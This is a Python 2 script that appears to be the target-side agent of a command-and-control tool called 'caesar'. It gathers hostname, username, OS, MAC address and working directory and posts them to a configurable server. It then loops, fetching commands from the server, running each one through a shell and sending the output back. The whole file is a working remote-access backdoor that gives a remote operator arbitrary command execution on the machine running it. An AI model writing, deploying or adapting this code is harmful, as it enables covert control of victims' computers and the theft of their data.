#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import platform
import hashlib
import requests
import getpass
from uuid import getnode
from time import sleep
from subprocess import *
from requests.utils import quote

# Replace with your URL/IP
caesar_folder = 'localhost/caesar'

def md5 (string):
	m = hashlib.md5()
	m.update (string)
	return m.hexdigest()

def split_response (response, start_separator, end_separator):
	output = []
	tmp = response.split(start_separator)
	for par in tmp:
		if end_separator in par:
			output.append(par.split(end_separator)[0])

	return output

# Getting information from the system
hostname = platform.node()
username = getpass.getuser()
operating_system = platform.system() + ' ' + platform.release()
arch = platform.architecture()[0]
mac = "".join(c + ":" if i % 2 else c for i, c in enumerate(hex(getnode())[2:].zfill(12)))[:-2]
working_directory = os.getcwd()

# Generating unique id
unique_id = md5 (mac + operating_system + arch)

# Setting refresh delay
delay = 10

# while the server does not responds 'OK' sends an handshake request
while 1:

	try:
		r = requests.post ('http://' + caesar_folder + '/target/handshake.php', data={'hostname': quote(hostname), 'username': quote(username), 'os': quote(operating_system), 'arch': arch, 'unique_id': unique_id, 'wd': quote(working_directory)})
		if r.text == 'OK':
			break	
	except:
		print 'Connection refused'	
		sleep (1)

no_response = 0
while 1:

	# Check if there are new commands to execute
	r = requests.post ('http://' + caesar_folder + '/target/tasks.php', data={'unique_id': unique_id})
	response = r.text

	# If the response from the server is not empty
	if response != '':

		# Splitting the response in order to get a list of commands to execute (and their identifiers)
		commands = split_response (response, '<command>', '</command>')
		ids = split_response (response, '<task_id>', '</task_id>')
				
		# Executing all commands contained in the list
		for command, task_id in zip(commands, ids):

			# If the user want a remote pseudo-connection 
			if command == 'connect':
				delay = 0.5
				output = 'connected'
	
			elif command == 'exit':
				delay = 10
				output = 'exit'

			elif command.startswith('cd '):
				try:
					directory = command.replace('cd ', '')
					os.chdir(directory)
					working_directory = os.getcwd()
					output = ''
				except OSError as e:
					output = e.strerror + "\n"

			else:
				exe = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
				out = exe.stdout.read()
				err = exe.stderr.read()

				# If there are errors
				if err != '':
					output = err
				else:
					output = out

				exe.stdout.close()
				exe.stdin.close()
				exe.stderr.close()

			# Send output to the server
			r = requests.post ('http://' + caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})

	else:
		# TODO: Check if delay != 10 before doing this
		no_response += 1
		if no_response == 60:
			delay = 10
			no_response = 0

	sleep (delay)
